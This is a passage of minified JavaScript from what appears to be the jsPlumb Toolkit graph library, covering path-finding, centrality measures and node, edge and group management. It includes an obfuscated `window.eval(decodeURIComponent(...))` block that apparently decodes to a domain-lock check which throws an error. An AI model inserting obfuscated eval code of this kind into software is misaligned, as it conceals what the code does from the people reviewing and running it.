n=[];for(var t in a)n.push(a[t]);return n},this.findPath=function(n,t,e,o,i){return n=y(n),t=y(t),c.compute({graph:this,source:n,target:t,strict:!(!1===e),nodeFilter:o,edgeFilter:i})},this.getDistance=function(n,t,e){return this.findPath(n,t,e).pathDistance},this.getVertex=this.getNode=y,this.setTarget=function(n,t){if(null==(t=y(t)))return{success:!1};var e=n.target;return n.target.deleteEdge(n),n.target=t,t.addEdge(n),{old:e,edge:n,new:t,success:!0}},this.setSource=function(n,t){if(null==(t=y(t)))return{success:!1};var e=n.source;return n.source.deleteEdge(n),n.source=t,t.addEdge(n),{old:e,edge:n,new:t,success:!0}},this.printPath=function(n,t){n=y(n),t=y(t);for(var e=this.findPath(n,t).path,o="["+n.id+" - "+t.id+"] : ",i=0;i<e.length;i++)o=o+"{ vertex:"+e[i].vertex.id+", cost:"+e[i].cost+", edge: "+(e[i].edge&&e[i].edge.getId())+" } ";return o},this.getDiameter=function(n){for(var t=0,e=0;e<this.vertices.length;e++)for(var o=0;o<this.vertices.length;o++)if(o!=e){var i=c.compute({graph:this,source:this.vertices[e],target:this.vertices[o]});if(null==i.path||0==i.path.length){if(!n)return 1/0}else t=Math.max(t,i.pathDistance)}return t},this.diameter=this.getDiameter,this.getCentrality=function(n){return((n=y(n)).getIndegreeCentrality()+n.getOutdegreeCentrality())/(this.getVertexCount()-1)},this.getDegreeCentrality=this.getCentrality,this.getIndegreeCentrality=function(n){return(n=y(n)).getIndegreeCentrality()/(this.getVertexCount()-1)},this.getOutdegreeCentrality=function(n){return(n=y(n)).getOutdegreeCentrality()/(this.getVertexCount()-1)},this.getCloseness=function(n){return 1/this.getFarness(n)},this.getFarness=function(n){n=y(n);var t=c.compute({graph:this,source:n,target:n,processAll:!0}),e=0;for(var o in t.dist)e+=t.dist[o];return e/(this.getVertexCount()-1)},this.getBetweenness=function(n){var t=this.getVertexCount(),e=(t-1)*(t-2)/2,o=0,i=function n(t,e,o,i,r){var d=o.parents[t][e];if(0==d.length)(s=i.slice()).unshift(t),r.push(s);else for(var _=0;_<d.length;_++){var s;if(-1==i.indexOf(d[_][0].id))(s=i.slice()).unshift(d[_][0].id),n(t,d[_][0].id,o,s,r)}};n=y(n);var r=u.compute({graph:this,focus:n});for(var d in r.paths)for(var _ in r.paths[d])if(d!=_){var s=[],a=0;i(d,_,r,[_],s);for(var w=0;w<s.length;w++){var l=s[w].indexOf(n.id);l>0&&l<s[w].length-1&&a++}o+=a/s.length,a}return o/e},this.inspect=function(){for(var n="",t=0;t<this.vertices.length;t++)n+=this.vertices[t].inspect()+"\n";return n},this.serialize=function(){for(var n,t,e,o,i={nodes:[],edges:[],ports:[],groups:[]},r=0;r<this.vertices.length;r++){n=this.vertices[r],i.nodes.push(n.data),t=n.getAllEdges(),e=n.getPorts();for(var d=0;d<t.length;d++)if(t[d].source==n||"Port"===t[d].source.objectType&&t[d].source.getNode()==n){var _={source:t[d].source.getFullId(),target:t[d].target.getFullId()};t[d].data&&(_.data=t[d].data),i.edges.push(_)}for(var s=0;s<e.length;s++){var a={};for(var w in e[s].data)a[w]=e[s].data[w];a.id=e[s].getFullId(),i.ports.push(a)}}for(r=0;r<this.groups.length;r++){o=this.groups[r],i.groups.push(o.data),t=o.getEdges();for(d=0;d<t.length;d++)if(t[d].source===o){_={source:o.getFullId(),target:t[d].target.getFullId()};t[d].data&&(_.data=t[d].data),i.edges.push(_)}}return i},this.getClusters=function(){var n,t=[],e={},o=function n(o,i){if(null!=o&&!e[o.id]){null==i?(i=new s(o),t.push(i)):i.addVertex(o),e[o.id]=!0;for(var r=o.getAllEdges(),d=0;d<r.length;d++){n(r[d].source===o?r[d].target:r[d].source,i)}}};for(n=0;n<this.vertices.length;n++)o(this.vertices[n]);for(n=0;n<this.groups.length;n++)o(this.groups[n]);return t}},function(n,t,e,o,i){for(var r=-1,d=null,_=1/0,s=0;s<n.length;s++)if(!t[s]){var a=i(n[s]);a<_&&(_=a,r=s,d=n[s])}return{node:d,index:r}}),w=function(n,t){var e=t.getFullId(),o=n[e];return null==o&&(o=n[e=t.getNode?t.getNode().id:t.id]),null==o?null:{p:o,id:e}},l=function(n,t,e,o,i,r){for(var d=[],_=o,s=w(t,_);null!=s;)d.splice(0,0,{vertex:_,cost:n[s.id],edge:e[s.id]}),_=s.p,s=w(t,_);return d.splice(0,0,{vertex:_,cost:0,edge:null}),d},u={getPath:function(n,t,e,o){if(n[e.id][o.id]==1/0)return null;var i=t[e.id][o.id];return null==i?" ":u.getPath(n,t,e,i)+" "+i.id+" "+u.getPath(n,t,i,o)},getPaths:function(n,t,e,o,i){if(n[e.id][o.id]==1/0)return null;var r=t[e.id][o.id];return 0==r.length?" ":u.getPaths(n,t,e,r[0])+" "+r[0].id+" "+u.getPaths(n,t,r[0],o)},compute:function(n){var t,e,o,i=n.graph,r=i.getVertexCount(),d={},_={};for(t=0;t<r;t++){var s=i.getVertexAt(t);for(d[s.id]||(d[s.id]={}),_[s.id]||(_[s.id]={}),d[s.id][s.id]=0,e=0;e<r;e++)if(t!=e){var a=i.getVertexAt(e);d[s.id][a.id]||(d[s.id][a.id]=1/0),_[s.id][a.id]||(_[s.id][a.id]=[])}var w=s.getEdges();for(o=0;o<w.length;o++)w[o].source==s?d[s.id][w[o].target.id]=w[o].getCost():(d[w[o].source.id]||(d[w[o].source.id]={},_[w[o].source.id]={}),d[s.id][w[o].source.id]=w[o].getCost())}for(o=0;o<r;o++)for(t=0;t<r;t++)for(e=0;e<r;e++)if(t!=e&&e!=o&&t!=o){var l=i.getVertexAt(t).id,u=i.getVertexAt(e).id,c=i.getVertexAt(o).id;d[l][c]+d[c][u]<=d[l][u]&&d[l][c]+d[c][u]!=1/0&&(d[l][u]=d[l][c]+d[c][u],_[l][u]||(_[l][u]=[]),_[l][u].unshift([i.getVertexAt(o),d[l][u]]))}return{paths:d,parents:_}}},c={compute:function(n){for(var t=n.graph,e=n.source,o=n.target,i=n.nodeFilter,r=n.edgeFilter,d={},_={},s={},w={dist:d,previous:_,edges:s,path:[]},u=n.processAll,c={},B={},h=!(!1===n.strict),j=function(n){return n.getFullId?n.getFullId():n.id},p=[],f=function(n){var t=B[n.getFullId()];return c[t.v.id]},g=function(n,t){var e,o;if("Port"===n.objectType){for(d[n.getFullId()]=t,e=f(n),o=0;o<e.length;o++)e[o].p!=n&&(d[e[o].p.getFullId()]=t+n.getNode().getInternalEdge(n,e[o].p).cost);h||(d[n.getNode().id]=t)}else for(d[n.id]=t,e=c[n.id],o=0;o<e.length;o++)d[e[o].p.getFullId()]=t},m=function(n){return i&&!i(n)?1/0:d[j(n)]},v=function(n,t,e){if("Port"===n.objectType){for(var o=f(n),i=0;i<o.length;i++)_[o[i].p.getFullId()]=e.node;h||(_[n.getNode().id]=e.node)}_[t]=e.node},C=function(n,t,e){if("Port"===n.objectType){for(var o=f(n),i=0;i<o.length;i++)s[o[i].p.getFullId()]=e;h||(s[n.getNode().id]=e)}s[t]=e},b=0;b<t.vertices.length;b++){var y=t.vertices[b],D=y.getPorts();p.push(y);var P={v:y,i:p.length-1};c[y.id]=[],g(y,1/0);for(var E=0;E<D.length;E++)p.push(D[E]),B[D[E].getFullId()]=P,c[y.id].push({p:D[E],i:p.length-1}),g(D[E],1/0)}if(null==e&&(e=t.getVertex(n.sourceId)),null==o&&(o=t.getVertex(n.targetId)),null==e||null==o)return w;e.getNode&&e.getNode(),o.getNode&&o.getNode(),g(e,0);for(var x=new Array(t.vertices.length),A=0,S=function(n,t,e,o){for(var i=0;i<t.length;i++){var r=t[i];if(e(r)){var d=o(r),_=d.tp||d.tn,s=j(_),a=m(n.node)+r.getCost();a<m(_)&&(g(_,a),v(_,s,n),C(_,s,r))}}};A<p.length;){var I=a(p,x,d,j,m),k=I.node?j(I.node):null;if(!I.node||m(I.node)==1/0)break;if(o&&(k==j(o)||!h&&I.node.isChildOf&&I.node.isChildOf(o))&&(w.path=l(d,_,s,o),w.pathDistance=w.path[w.path.length-1].cost,!u))break;x[I.index]=!0,A+=1,S(I,I.node.getAllEdges(),function(n){return!(r&&!r(n))&&(!n.isDirected()||I.node==n.source||!h&&n.source.isChildOf&&n.source.isChildOf(I.node))},function(n){var t=n.source.getNode?n.source.getNode():n.source,e=n.source.getNode?n.source:null,o=n.target.getNode?n.target.getNode():n.target,i=n.target.getNode?n.target:null;return n.source==I.node||!h&&n.source.isChildOf&&n.source.isChildOf(I.node)?{tn:o,tp:i}:{tn:t,tp:e}})}return w}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbUtil,e=n.jsPlumb,o=n.jsPlumbToolkitUtil,i=n.jsPlumbGraph,r="type",_="default",s=function(n){return n.id};n.jsPlumbToolkitInstance=function(a){var w=(a=a||{}).idFunction||s,l=a.typeProperty||r,u=a.edgeTypeProperty||r,c=a.portTypeProperty||r,B=a.typeFunction||function(n){return n[l]||_},h=a.edgeIdFunction||w,j=a.edgeTypeFunction||function(n){return n[u]||_},p=a.portIdFunction||w,f=a.portTypeFunction||function(n){return n[c]||_},g=a.portExtractor,m=a.portUpdater,v=this,C=!1,b=!1,y=a.model||{},D=function(n,e,i){e=null!=e&&t.isObject(e)?e:{},(e=t.clone(e)).id=e.id||o.uuid(),e.type=e.type||(null==n?null:n.type||n),i(e)},P=a.nodeFactory||D,E=a.edgeFactory||D,x=a.portFactory||D,A=a.groupFactory||D,S=a.autoSave&&a.saveUrl,I=a.saveUrl,k=a.saveHeaders,T=a.onAutoSaveSuccess||function(){},M=a.onAutoSaveError||function(){},N=!0===a.doNotUpdateOriginalData,O=a.onBeforeAutoSave||function(){},F=a.onAfterAutoSave||function(){},L={portSeparator:a.portSeparator,defaultCost:a.defaultCost,defaultDirected:a.defaultDirected,enableSubgraphs:a.enableSubgraphs},R=!0===a.createMissingGroups;t.EventGenerator.apply(this,arguments);var G=new i.Graph(L);S&&new o.AutoSaver(this,I,k,T,M,O,F),new o.CatchAllEventHandler(this),this.getNodeFactory=function(){return P},this.getGroupFactory=function(){return A},this.getEdgeFactory=function(){return E},this.getPortFactory=function(){return x},this.setNodeFactory=function(n){P=n},this.setGroupFactory=function(n){A=n},this.setEdgeFactory=function(n){E=n},this.setPortFactory=function(n){x=n},this.setDebugEnabled=function(n){b=n},this.isDebugEnabled=function(){return b},this.getModel=function(){return y||{}};var U,z=function(){return null==U&&(U=new n.jsPlumbToolkit.Model(y||{})),U},V=function(n,t){if(null==y)return!0;var e=this.getType(n),o=this.getType(t),i=z(),r=n.getNode?n.getNode():n,d=t.getNode?t.getNode():t,_="Node"==n.objectType?i.getNodeDefinition(e):i.getPortDefinition(e),s="Node"==t.objectType?i.getNodeDefinition(o):i.getPortDefinition(o),a=this.getNodeType(r),w=this.getNodeType(d),l=i.getNodeDefinition(a),u=i.getNodeDefinition(w);return!(null!=_.maxConnections&&n.getEdges().length>=_.maxConnections||null!=s.maxConnections&&t.getEdges().length>=s.maxConnections||(n==t?!1===l.allowLoopback||!1===_.allowLoopback||!1===s.allowLoopback||!1===u.allowLoopback:r==d&&(!1===l.allowNodeLoopback||!1===_.allowNodeLoopback||!1===s.allowNodeLoopback||!1===u.allowNodeLoopback)))}.bind(this);this.beforeConnect=a.beforeConnect||V,this.beforeMoveConnection=a.beforeMoveConnection||V,this.beforeStartConnect=a.beforeStartConnect||function(n,t){return{}},this.beforeDetach=a.beforeDetach||function(n,t,e){return!0},this.beforeStartDetach=a.beforeStartDetach||function(n,t){return!0},this.setSuspendGraph=function(n){C=n},this.setDoNotUpdateOriginalData=function(n){N=n},this.getTypeFunction=function(){return B},this.connect=function(n){var t;if(n=n||{},!C){var o=G.getVertex(n.source),i=G.getVertex(n.target),r=n.cost,_=n.directed;if(!o){if(n.doNotCreateMissingNodes)return;o=G.addVertex(n.source),v.fire("nodeAdded",{data:{},node:o})}if(!i){if(n.doNotCreateMissingNodes)return;i=G.addVertex(n.target),v.fire("nodeAdded",{data:{},node:i})}var s=this.beforeStartConnect(o,j(n.data||{}));if(s){var a=n.data||{};"object"==(void 0===s?"undefined":d()(s))&&e.extend(a,s),!1!==this.beforeConnect(o,i,a)&&(t=G.addEdge({source:o,target:i,cost:r,directed:_,data:a}),v.fire("edgeAdded",{edge:t}))}}return t},this.clear=function(){return this.fire("graphClearStart"),G.clear(),this.fire("graphCleared"),this},this.getGraph=function(){return G},this.getNodeCount=function(){return G.getVertexCount()},this.getNodeAt=function(n){return G.getVertexAt(n)},this.getNodes=function(){return G.getVertices()},this.eachNode=function(n){for(var t=0,e=G.getVertexCount();t<e;t++)n(t,G.getVertexAt(t))},this.eachGroup=function(n){for(var t=0,e=G.getGroupCount();t<e;t++)n(t,G.getGroupAt(t))},this.eachEdge=function(n){for(var t=G.getEdges(),e=0,o=t.length;e<o;e++)n(e,t[e])},this.getEdgeCount=function(){return G.getEdgeCount()},this.getGroupCount=function(){return G.getGroupCount()},this.getGroupAt=function(n){return G.getGroupAt(n)},this.getClusters=function(){return G.getClusters()},this.getNodeId=function(n){return t.isObject(n)?w(n):n},this.getNodeType=function(n){return B(n)||"default"},this.getEdgeId=function(n){return t.isObject(n)?h(n):n},this.getEdgeType=function(n){return j(n)||"default"},this.getPortId=function(n){return t.isObject(n)?p(n):n},this.getPortType=function(n){return f(n)||"default"},this.getType=function(n){return("Node"===n.objectType?B:"Port"===n.objectType?f:j)(n.data)||"default"},this.setType=function(n,t){var e=this.getType(n);if(e!==t){var o="Node"===n.objectType?l:"Port"===n.objectType?c:u,i=n.objectType.charAt(0).toLowerCase()+n.objectType.substring(1)+"TypeChanged";n.data[o]=t,this.fire(i,{obj:n,previousType:e,newType:t})}},this.addNode=function(t,e,i){var r=w(t);null==r&&"string"!=typeof t&&(t.id=o.uuid());var d=G.addNode(t,w);if(null!=d){if(null!=g){var _=g(d.data,d);if(null!=_)for(var s=0;s<_.length;s++)d.addPort(_[s])}if("string"!=typeof t&&null!=t.group){var a=this.getGroup(t.group);null==a&&R&&(a=G.addGroup(t.group)),null!=a&&a.addVertex(d)}return q||N||n.jsPlumbToolkitIO.manage("addNode",Y,Z,d,w||G.getIdFunction(),v),i||v.fire("nodeAdded",{data:t,node:d,eventInfo:e}),d}return G.getNode(r)},this.addFactoryNode=function(n,t,e){t=2!==arguments.length||null!=arguments[1]&&"object"!=d()(arguments[1])?{}:arguments[1],e=3===arguments.length?arguments[2]:"function"==typeof arguments[1]?arguments[1]:null,t.type=t.type||n,P(n,t,function(n){var t=this.addNode(n);e&&e(t)}.bind(this))},this.addNodes=function(n){for(var t=0;t<n.length;t++)v.addNode.apply(v,[n[t]]);return v},this.addGroup=function(t,e,i){null==w(t)&&"string"!=typeof t&&(t.id=o.uuid());var r=G.addGroup(t,w);return q||N||n.jsPlumbToolkitIO.manage("addGroup",Y,Z,r,w||G.getIdFunction(),v),i||v.fire("groupAdded",{data:t,group:r,eventInfo:e}),r},this.addToGroup=function(n,t){var e=!1;return n=v.getNode(n),t=v.getGroup(t),n&&t&&(e=t.addVertex(n))&&(n.data.group=t.id,v.fire("group:addMember",{node:n,group:this.getGroup(t)}),v.fire("dataUpdated")),e},this.removeFromGroup=function(n,t){var e;return(n=v.getNode(n))&&n.group&&((e=n.group).deleteVertex(n),delete n.data.group,t||v.fire("group:removeMember",{node:n,group:e}),v.fire("dataUpdated")),e},this.removeGroup=function(t,e,o){var i=G.deleteGroup(t,e);return i&&(q||N||n.jsPlumbToolkitIO.manage("removeGroup",Y,Z,i,w||G.getIdFunction(),v),o||v.fire("groupRemoved",{group:i,removeChildNodes:e})),v},this.getNode=function(n){return G.getVertex(n)},this.getEdge=function(n){return G.getEdge(n)},this.getGroup=function(n){return G.getGroup(n)},this.exists=function(n){for(var t=0;t<arguments.length;t++)if(null==G.getVertex(arguments[t]))return!1;return!0},this.removeNode=function(t,e){for(var o=(t=t.constructor===i.Vertex||t.constructor===i.Port?t:G.getVertex(t)).getAllEdges()||[],r=0;r<o.length;r++)v.removeEdge(o[r]);return G.deleteVertex(t.id),q||N||n.jsPlumbToolkitIO.manage("removeNode",Y,Z,t,w||G.getIdFunction(),v),e||v.fire("nodeRemoved",{node:t,nodeId:t.id,edges:o}),v},this.addEdge=function(t,e,o){var i=G.addEdge(t,h,this.beforeConnect);return q||N||n.jsPlumbToolkitIO.manage("addEdge",Y,Z,i,h||G.getIdFunction(),v),o||v.fire("edgeAdded",{edge:i,source:e,geometry:t.geometry,addedByMouse:t.addedByMouse},null),i},this.removeEdge=function(t,e){return null!=(t=G.getEdge(t))&&(G.deleteEdge(t),q||N||n.jsPlumbToolkitIO.manage("removeEdge",Y,Z,t,h||G.getIdFunction(),v),v.fire("edgeRemoved",{edge:t,source:e},null)),v},this.edgeMoved=function(n,t,e){return n[0===e?"source":"target"],this[0===e?"setSource":"setTarget"](n,t)},this.setTarget=function(n,t,e){var o=G.setTarget.apply(G,arguments);return!1===o.success||e||v.fire("edgeTarget",o),o},this.setSource=function(n,t,e){var o=G.setSource.apply(G,arguments);return!1===o.success||e||v.fire("edgeSource",o),o},this.addNewPort=function(t,e,o,i){t=G.getVertex(t),x({node:t,type:e},o,function(e){var o=p(e),r=t.addPort(o);r.data=e,W(t),q||N||n.jsPlumbToolkitIO.manage("addPort",Y,Z,{node:t,port:r},p||G.getIdFunction(),v),i||v.fire("portAdded",{node:t,data:e,port:r},null)})},this.addPort=function(t,e,o){var i=t.addPort(e,p);return W(t),q||N||n.jsPlumbToolkitIO.manage("addPort",Y,Z,{node:t,port:i},p||G.getIdFunction(),v),o||v.fire("portAdded",{node:t,data:e,port:i},null),i},this.removePort=function(n,t,e){var o=!1,r=(n=n.constructor===i.Vertex||n.constructor===i.Port?n:G.getVertex(n)).getPort(t);if(r){var d=r.getAllEdges();if((o=n.removePort(r))&&!e){W(n),v.fire("portRemoved",{node:n,port:r,edges:d},null);for(var _=0;_<d.length;_++)v.removeEdge(d[_])}}return o},this.remove=function(n){if(null!=n){var t=v.getObjectInfo(n);v.setSuspendRendering(!0);try{if(!t.obj||"Node"!==t.type&&"Edge"!==t.type&&"Group"!==t.type){for(;n.getNodeCount()>0;)v.removeNode(n.getNodeAt(0));for(;n.getEdgeCount()>0;)v.removeEdge(n.getEdgeAt(0));for(;n.getGroupCount()>0;)v.removeGroup(n.getGroupAt(0))}else v["remove"+t.type](t.obj)}finally{v.setSuspendRendering(!1,!0)}}},this.setSuspendRendering=function(n,t){for(var e in en)en[e].setSuspendRendering(n,t)},this.batch=function(n){v.setSuspendRendering(!0);try{n()}catch(n){jsPlumbUtil.log("Error in transaction "+n)}finally{v.setSuspendRendering(!1,!0)}};var H=function(n,o,i,r,d){var _=G.getNode(n);if(_&&_.objectType){var s=e.extend({},_.data);if(o){for(var a in o)t.replace(_.data,a,o[a]);"Port"===_.objectType&&W(_.getNode())}v.fire(i,r(_,s),null)}}.bind(this),W=function(n){if(null!=m){var t=m(n.data,n,n.getPorts());null!=t&&(n.data=t)}};this.updateNode=function(n,t){H(n,t,"nodeUpdated",function(n,e){return{node:n,updates:t||{},originalData:e}})},this.updatePort=function(n,t){H(n,t,"portUpdated",function(n,e){return{port:n,node:n.getNode(),updates:t||{},originalData:e}})},this.updateEdge=function(n,o){var i=G.getEdge(n);if(i){var r=e.extend({},i.data);if(o)for(var d in o)null==i.data[d]?i.data[d]=o[d]:t.replace(i.data,d,o[d]);v.fire("edgeUpdated",{edge:i,updates:o||{},originalData:r},null)}},this.update=function(n,e){return t.isString(n)&&(n=this.getNode(n)),n&&n.objectType&&this["update"+n.objectType](n,e),n},this.getPath=function(t){return new n.jsPlumbToolkit.Path(this,t)};var X=this.findGraphObject=function(n){return null==n?null:"*"===n?G:n.constructor===i.Vertex||n.constructor===i.Port?n:t.isString(n)||t.isObject(n)?G.getVertex(n):null};this.getEdges=function(n){return function(n,t,e){var o=[],r={},d=function(n){r[n.getId()]||(o.push(n),r[n.getId()]=!0)},_=function(o,r,_,s){if(null!=o)for(var a=o[t]({filter:n.filter}),w=0;w<a.length;w++){var l=r&&o===G||a[w].source===o||e&&a[w].source.constructor===i.Port&&a[w].source.getNode()===o,u=_&&o===G||a[w].target===o||e&&a[w].target.constructor===i.Port&&a[w].target.getNode()===o;(r&&l||_&&u||s&&(l||u))&&d(a[w])}};return _(X((n=n||{}).source),!0,!1,!1),_(X(n.target),!1,!0,!1),_(X(n.element),!1,!1,!0),o}(n,"getEdges",!1)},this.getAllEdges=function(){return G.getAllEdges()},this.getAllEdgesFor=function(n,t){return n.getAllEdges({filter:t})},this.selectAllEdges=function(){return this.filter(function(n){return"Edge"===n.objectType})},this.addAllEdgesToSelection=function(){this.addToSelection(this.getAllEdges())};var Y,Z,q,$=function(t,e,i){var r=(t=t||{}).type||"json",d=t.data,_=t.url,s=t.jsonp,a=t.onload,w=t.parameters||{},l=t.error||function(){};if(null==d&&null==_)throw new TypeError("You must supply either data or url to load.");var u=function(t){Y=t,Z=r,q=!0,v.fire(e),n.jsPlumbToolkitIO.parse(r,t,v,w),tn(i),a&&a(v,t),v.fire("graphChanged")};if(d)u(d);else if(_){if(s)_=_+(-1===_.indexOf("?")?"?":"&")+"callback=?";var c="json"===r?r:t.dataType,B=t.headers||{Accept:"application/json"};o.ajax({url:_,success:u,dataType:c,error:l,headers:B})}return v};this.load=function(n){return $(n,"dataLoadStart","dataLoadEnd")},this.append=function(n){return $(n,"dataAppendStart","dataAppendEnd")},this.save=function(n){n=n||{};var t=this.exportData(n),i={"Content-Type":"application/json"};return e.extend(i,n.headers||{}),o.ajax({url:n.url,type:"POST",data:t,success:n.success||function(){},error:n.error||function(){},headers:i}),v},this.exportData=function(t){return t=t||{},n.jsPlumbToolkitIO.exportData(t.type||"json",v,t.parameters)};var J=function(n){return new o.Selection({toolkit:v,onClear:n||function(){}})},K=J(function(n){v.fire("selectionCleared",{selection:n})});a.maxSelectedNodes&&K.setMaxNodes(a.maxSelectedNodes),a.maxSelectedEdges&&K.setMaxEdges(a.maxSelectedEdges),a.selectionCapacityPolicy&&K.setCapacityPolicy(a.selectionCapacityPolicy);var Q=function(n,t,e,o){return t||e.clear(!0),e.append(n,function(n){o&&v.fire("select",{append:t,obj:n,selection:e})})};this.setSelection=function(n){Q(n,!1,K,!0)},this.select=function(n,t){var e=J(),o=Q(n,!0,e);if(t)for(var i=0;i<o[0].length;i++){var r=o[0][i];if("Node"===r.objectType||"Port"===r.objectType)for(var d=r.getAllEdges(),_=0;_<d.length;_++)e.append(d[_])}return e};this.selectDescendants=function(n,t,e){var o=v.getObjectInfo(n),i=J();if(o.obj&&"Node"===o.obj.objectType){t&&Q(o.obj,!0,i);var r={};r[o.obj.getFullId()]=!0,function n(t,e,o,i){for(var r=t.getAllEdges(),d=0,_=r.length;d<_;d++)if(r[d].source===t||r[d].getNode&&r[d].getNode()===t){var s=r[d].target,a=s.getFullId();i[a]||(e.append(s),o&&e.append(r[d]),i[a]=!0,n(s,e,o,i))}}(o.obj,i,e,r)}return i},this.filter=function(n,t){var e="function"==typeof n?n:function(e){var o=e.data,i=!1;for(var r in n){var d=n[r]===o[r];if(!d&&!t)return!1;i=i||d}return i},o=J();return this.eachNode(function(n,t){e(t)&&o.append(t);for(var i=t.getPorts(),r=0;r<i.length;r++)e(i[r])&&o.append(i[r])}),this.eachEdge(function(n,t){e(t)&&o.append(t)}),this.eachGroup(function(n,t){e(t)&&o.append(t)}),o},this.addToSelection=function(n){var t=this.getObjectInfo(n);if(t){var e=Q(t.obj,!0,K,!0);nn("deselect",e[1]),nn("select",e[0])}};var nn=function(n,t){for(var e=0;e<t.length;e++)v.fire(n,{obj:t[e],selection:K})};this.toggleSelection=function(n){var 